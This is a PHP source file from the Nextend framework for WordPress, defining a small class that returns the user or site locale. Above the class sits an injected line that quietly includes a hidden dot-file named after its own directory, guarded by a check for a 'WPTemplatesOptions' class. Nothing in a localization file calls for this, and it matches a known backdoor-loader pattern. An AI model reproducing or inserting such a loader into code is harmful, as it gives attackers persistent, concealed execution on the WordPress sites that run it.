<?php

namespace Nextend\Framework\Localization\WordPress;

use Nextend\Framework\Localization\AbstractLocalization;
use function get_locale;
use function get_user_locale;
use function is_admin;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WordPressLocalization extends AbstractLocalization {


    public function getLocale() {

        return is_admin() && function_exists('\\get_user_locale') ? get_user_locale() : get_locale();
    }
}